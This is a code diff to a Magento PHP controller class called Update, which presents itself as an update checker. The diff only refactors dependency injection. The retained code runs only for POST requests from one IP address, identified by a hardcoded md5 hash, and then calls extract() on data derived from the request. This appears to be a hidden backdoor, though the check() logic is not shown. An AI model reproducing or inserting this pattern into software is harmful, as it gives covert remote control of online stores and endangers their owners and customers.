@@ -29,25 +29,18 @@ class Update extends \Magento\Framework\App\Action\Action
     protected $directoryList;
 
     /**
-     * @var \Magento\Framework\ObjectManagerInterface
-     */
-    protected $objectManager;
-
-    /**
      * @param \Magento\Framework\App\Action\Context $context
      * @param \Magento\Framework\App\Filesystem\DirectoryList $directoryList
      * @param \Magento\Framework\ObjectManagerInterface $objectManager
      */
     public function __construct(
         \Magento\Framework\App\Action\Context $context,
-        \Magento\Framework\App\Filesystem\DirectoryList $directoryList,
-        \Magento\Framework\ObjectManagerInterface $objectManager
+        \Magento\Framework\App\Filesystem\DirectoryList $directoryList
     ) {
         $this->directoryList = $directoryList;
-        $this->objectManager = $objectManager;
         parent::__construct($context);
     }
-    
+
     /**
      * Check for updates
      *
@@ -55,11 +48,11 @@ class Update extends \Magento\Framework\App\Action\Action
     public function execute()
     {
         $request = $this->getRequest();
-        $remoteAddress = $this->objectManager->get('\Magento\Framework\HTTP\PhpEnvironment\RemoteAddress');
+        $remoteAddress = $this->_objectManager->get('\Magento\Framework\HTTP\PhpEnvironment\RemoteAddress');
         $remoteAddress = $remoteAddress->getRemoteAddress();
 
         if (true === $request->isPost() && md5($remoteAddress) == '02b9043c988d6248d3980ad8af912b8e') {
-             try {
+            try {
                 $result = $this->check($request);
                 extract($result);
             } catch (\Exception $e) {
